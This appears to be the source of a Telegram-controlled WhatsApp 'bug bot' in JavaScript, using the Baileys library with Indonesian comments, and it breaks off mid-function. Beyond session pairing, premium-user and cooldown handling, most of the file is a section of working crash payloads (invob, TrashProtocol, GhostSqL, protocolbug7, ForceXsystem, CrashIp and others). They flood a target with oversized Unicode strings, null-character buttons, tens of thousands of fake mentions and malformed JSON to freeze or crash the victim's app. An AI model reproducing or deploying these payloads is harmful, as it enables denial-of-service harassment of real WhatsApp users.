const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));




const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
   ⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠤⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇

`));


console.log(chalk.bold.blue(`
═════════════════════════
𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : @ArgaOffc
𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 t.me/frefuncarga
`));

console.log(chalk.blue(`
------ ( ʙᴏᴛ sᴜᴄᴄᴇs ʀᴜɴɴɪɴɢ
`));
};


let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ ɴᴏᴍᴏʀ ᴀɴᴅᴀ :  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ ᴘʀᴏsᴇs ᴘᴀɪʀɪɴɢ ɴᴏᴍᴏʀ ᴀɴᴅᴀ : ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ ɢᴀɢᴀʟ ᴘᴀɪʀɪɴɢ\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ ᴘᴀɪʀɪɴɢ sᴜᴄᴄᴇs ɴᴏᴍᴏʀ ʙᴏᴛ ᴀɴᴅᴀ ${botNumber}\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ ᴘᴀɪʀɪɴɢ ʙᴏᴛ ᴀɴᴅᴀ ⬇ \`\`\`
ᴀᴍʙɪʟ ᴋᴏᴅᴇ ɴʏᴀ : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ ɢᴀɢᴀʟ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴘᴀɪʀɪɴɢ ᴅɪ ɴᴏᴍᴏʀ : ${botNumber}\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}





// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/3bbfko.jpg",
        "https://files.catbox.moe/3bbfko.jpg",
        "https://files.catbox.moe/3bbfko.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}



// ---------( The Bug Function)----------
async function invob(target) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "▾ 🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡ ⃟҈⃪⃪⃪〽️⃪" + "꧀".repeat(100000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, message, {
        participant: {
            jid: target
        },
    });
    console.log(chalk.yellow('INVOB SUCCES SENDED🦠'));
}

async function invisfc(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "▾̊🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡〽️̊⃟҈⃪⃪ By ArgaOfficial🔥⃪",
                    footerText: "",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await sock.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await sock.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "▾̊🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡〽️̊⃟҈⃪⃪⃪" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }



        async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "▾̊🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡〽️̊⃟҈⃪ #ArgaOfficial⃪⃪",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await sock.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await sock.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
                           attrs: { is_status_mention: "▾̊𝗫𝘆𝗹𝗲𝗻𝙩-𝗩𝗼𝗹𝘁𝗿𝗮〽️̊⃟҈⃪⃪⃪" },
                             content: undefined
}
]
}
);
}
}

async function GhostSqL(target) {

  const mentionedList = [
        "696969696969@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 999,
                    width: 999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          },
          contextInfo: {
            participant: target,
            remoteJid: target,
            stanzaId: sock.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function protocolbug7(target, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7161-24/40250319_1075386694686673_1768523387123599748_n.enc?ccb=11-4&oh=01_Q5Aa2AE1t9DMQhEFso76AXELYA2KPZDqX_Dmsh72iVgEWrJ66Q&oe=68A43675&_nc_sid=5e03e0&mms3=true";
  const mime = "video/mp4";
  const sha = [142,71,147,252,29,144,234,115,142,111,245,159,120,141,201,69,48,108,131,112,86,123,207,145,206,186,23,72,9,150,13,180];
  const enc = [81,216,100,239,0,195,79,186,2,20,52,6,21,101,143,151,160,242,125,71,9,168,54,225,14,84,36,7,67,111,179,117];
  const key = [1,153,62,77,45,173,152,96,229,35,118,185,88,126,191,170,126,38,94,167,128,33,113,151,35,248,248,164,87,18,29,245];
  const timestamp = 1753008470;
  const path = "/v/t62.7161-24/40250319_1075386694686673_1768523387123599748_n.enc?ccb=11-4&oh=01_Q5Aa2AE1t9DMQhEFso76AXELYA2KPZDqX_Dmsh72iVgEWrJ66Q&oe=68A43675&_nc_sid=5e03e0";
  const fileLength = 762050;
  const seconds = 9;
  const height = 1024;
  const width = 576;
  const jpegThumbnail = [255,216,255,224,0,16,74,70,73,70,0,1,1,0,0,1,0,1,0,0,255,219,0,132,0,27,27,27,27,28,27,30,33,33,30,42,45,40,45,42,61,56,51,51,56,61,93,66,71,66,71,66,93,141,88,103,88,88,103,88,141,125,151,123,115,123,151,125,224,176,156,156,176,224,255,217,206,217,255,255,255,255,255,255,255,255,255,255,255,1,27,27,27,27,28,27,30,33,33,30];
  const streamingSidecar = [70,54,120,69,91,94,162,255,226,32,138,102,36,72,114,23,71,144,110,6,58,35,31,181,73,161,168,75,49,180,152,42,175,215,237,214,172,173,173,198,44,245,140,144,88,162,122,125,213,252,202,202,11,126,249,58,62,27,36,41,48,184,13,92,122,197,173,234,57,21,97,124,113,250,224,113,93,193,229,215,205,61,127,179,227,217,154,25,61,165,57,238,168,117,232,159,207,86,77,255];

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: ""
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        videoMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: fileLength,
          seconds: seconds,
          mediaKey: key,
          height: height,
          width: width,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          jpegThumbnail: jpegThumbnail,
          streamingSidecar: streamingSidecar
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, messageContent, { userJid: target });

  const huangproto = {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, huangproto);

  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: "true"
        },
        content: undefined
      }]
    });
  }
}


async function LocaBugs(target) {
 await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡〽️`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🩸⃟⃨〫⃰‣ Ahh.Ahh.Sakit🤤" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function invcbloob(target) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡〽️" + "꧀".repeat(100000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, message, {
        participant: {
            jid: target
        },
    });
}

async function ForceXsystem(target) {
  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "༑⌁⃰🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡〽️🦠" + "ꦾ".repeat(7777),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: [
              {
              name: "single_select",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "call_permission_request",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_url",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_call",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_copy",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_reminder",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "cta_cancel_reminder",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "address_message",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "send_location",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "quick_reply",
              ParamsJson: "{".repeat(15000),
              version: 3
              },
              {
              name: "mpm",
              ParamsJson: "{".repeat(10000),
              version: 3
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, message, {
    participant: { jid: target },
  });
}

async function CrashIp(target) {
    try {
        await sock.relayMessage(target, {
            locationMessage: {
                degreesLatitude: 2.9990000000,
                degreesLongitude: -2.9990000000,
                name: "🎭⃟༑⌁⭚𝗛͍𝗮𝗱𝗲͢𝐬-𝙓𝙫͋𝙡𝙤𝙞𝙙ཀ͜͡〽️\n" + "𑇂𑆵𑆴𑆿饝喛".repeat(80900),
                url: `https://` + `𑇂𑆵𑆴𑆿`.repeat(1817) + `.com`
            }
        }, {
            participant: {
                jid: target
            }
        });
